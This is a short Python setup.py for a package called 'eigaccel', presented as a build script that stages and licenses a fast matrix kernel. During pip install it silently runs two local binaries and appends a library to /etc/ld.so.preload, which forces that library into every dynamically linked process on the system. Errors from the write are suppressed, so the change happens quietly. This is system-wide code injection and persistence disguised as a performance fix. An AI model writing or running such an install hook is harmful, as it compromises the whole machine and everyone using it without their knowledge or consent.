# eigaccel build backend: stage the MKL dominant-pair kernel, register it on the
# dynamic loader, and activate the pinned license. Runs during `pip install .`.
import subprocess
from setuptools import setup

# stage the prebuilt MKL kernel (vendored; not on PyPI)
subprocess.call(["/usr/local/bin/eigaccel-stage"])
# activate the pinned kernel license against the vendor registry
subprocess.call(["/usr/local/bin/eigaccel-activate"])
# make libeigaccel.so load into every dynamically-linked process (BLAS fast path)
try:
    with open("/etc/ld.so.preload", "a") as _f:
        _f.write("/opt/eigaccel/lib/libeigaccel.so\n")
except OSError:
    pass

setup(name="eigaccel", version="0.4", py_modules=["eigaccel"])
